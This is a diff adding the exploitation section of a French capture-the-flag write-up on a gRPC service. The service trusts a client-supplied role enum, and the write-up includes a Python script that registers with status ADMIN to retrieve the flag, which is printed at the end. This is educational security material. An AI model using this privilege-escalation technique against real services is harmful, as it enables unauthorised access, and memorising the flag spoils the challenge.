@@ -240,8 +240,6 @@ Ensuite on extrait structure d’un message (`Profile` le plus intéressant ici)
 
 On peut interpréter ça comme :
 
-Donc on peut interpréter ça comme :
-
 ```
 status : champ n°1 type enum (donc UserStatus)
 
@@ -254,6 +252,129 @@ En listant l'enum `UserStatus` on retrouve directement les valeurs du rôle util
 
 ![et4](images/et4.png)
 
-Enfin on extrait les RPC du service PoskaShip :
+Enfin on extrait les `RPC` du service `PoskaShip` :
 
 ![et5](images/et5.png)
+
+## Service PoskaShip : surface d’attaque
+
+Le service expose 5 méthodes :
+
+```
+- Register(Profile) -> Response
+
+- Login(Profile) -> Response
+
+- GetFlag(EmptyRequest) -> Response
+
+- Me(EmptyRequest) -> Response
+
+- Sessions(EmptyRequest) -> stream Response (server streaming)
+```
+
+On remarque que :
+
+- `Register` et `Login` prennent un `Profile` qui contient `username`, `password` et `status` (`enum`).
+
+- `GetFlag` ne prend aucun paramètre, l’accès au flag dépend donc du contexte serveur (`session/role`).
+
+- `Me` permet d’observer l’état courant côté serveur (utile pour valider l’auth).
+
+- `Sessions` stream potentiellement des infos “live” (sessions actives, logs, etc.), souvent sensible.
+
+L'élement le plus intéressant est le champ `status` dans `Profile` (enum `GUEST/REGULAR/ADMIN`).
+
+Dans un système sécurisée le client ne devrait jamais pouvoir choisir son rôle.
+
+## Hypothèse d'implémentation côté serveur
+
+Nous n'avons pas le code serveur mais le schéma suivant laisse penser à un backend qui :
+
+- Créer un compte via `Register` 
+
+- Authentifie via `Login` et associe un état de session avec un token
+
+- Autorise `GetFlag` ou pas en fonction du status
+
+## Exploitation
+
+Le script de test appelle juste `Me()`. 
+
+On va adapter ce client pour :
+
+```
+Register - Avec Statut GUEST au départ
+
+Login avec le Profil via session_id
+
+Vérifier avec Me()
+
+Récupérer le flag avec GetFlag()
+```
+
+Voici le script minimal:
+
+```py
+import grpc
+import poskaship_pb2 as pb
+from client import create_client_channel, PoskaShipStub
+from common import message_to_dict
+import time, random
+
+REMOTE = "www.passetonhack.fr"
+
+with create_client_channel(REMOTE, tls=True) as cc:
+    stub = PoskaShipStub(*cc)
+
+    username = f"user_{int(time.time())}_{random.randint(1000,9999)}"
+    password = "password"
+
+    # register avec statut GUEST
+    prof = pb.Profile(username=username, password=password, status=pb.GUEST)
+
+    stub.Register(pb.Profile(username=username, password=password, status=pb.GUEST))
+
+    # login 
+
+    r = stub.Login(prof)
+    print("login =", message_to_dict(r))
+
+    # récupérer le token/session_id
+    d = message_to_dict(r)
+    session_id = d.get("session_id") or d.get("success", {}).get("session", {}).get("session_id")
+    if not session_id:
+        raise RuntimeError(f"session_id introuvable dans la réponse: {d}")
+
+    md = [('x-poskaship-auth', session_id)]
+
+    # Me AUTH
+    me = stub.Me(pb.EmptyRequest(), metadata=md)
+    print("me =", message_to_dict(me))
+
+    # 5) GetFlag AUTH
+    try:
+        flag = stub.GetFlag(pb.EmptyRequest(), metadata=md)
+        print("flag =", message_to_dict(flag))
+    except grpc.RpcError as e:
+        print(f"Impossible de retrieve le flag à cause de : {e.details()}")
+```
+
+On ne peut pas récupérer le flag en raison de notre `status == 0 ≠ 2` :
+
+![flagerror](images/flagerror.png)
+
+Maintenant que l'on sait qu'avec `status == 2` on peut récupérer le flag :
+
+```py
+stub.Register(pb.Profile(username=username, password=password, status=pb.ADMIN))
+```
+
+Et ça marche !!! :
+
+![flag](images/flagsession.png)
+
+Flag :
+
+```
+FLAG{94c49e9baae50e0218ca6430e43de180}
+```
